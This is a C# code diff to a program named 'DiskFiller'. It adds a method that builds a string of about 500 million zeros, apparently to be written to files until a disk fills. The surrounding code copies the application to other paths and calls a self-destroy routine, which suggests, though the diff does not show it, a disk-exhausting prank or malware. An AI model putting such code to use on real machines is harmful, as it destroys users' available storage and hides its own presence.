@@ -23,7 +23,7 @@ namespace DiskFiller
 
         private readonly string applicationName = string.Empty;
         private readonly ApplicationPaths finalPaths;
-
+        private readonly string fileContent;
 
 
         internal DiskFiller()
@@ -71,7 +71,7 @@ namespace DiskFiller
 
 
             // Prepare the content which will be written to the files
-
+            string fileContent = PrepareFileContent();
 
 
             // Start the writing
@@ -152,6 +152,8 @@ namespace DiskFiller
             return appPaths;
         }
 
+
+
         /// <summary>
         /// Copies a file from one path to another
         /// </summary>
@@ -173,6 +175,27 @@ namespace DiskFiller
             {
                 DestroySelf();
             }
+        }
+
+
+
+        /// <summary>
+        /// Fills a string with much 0's (about 500mb)
+        /// </summary>
+        /// 
+        /// <returns>
+        /// The filled string with 500mb worth of 0's
+        /// </returns>
+        private string PrepareFileContent()
+        {
+            string fileContent = "0000";
+
+            for (int i = 0; i < 27; i++)
+            {
+                fileContent += fileContent;
+            }
+
+            return fileContent;
         }
     }
 }
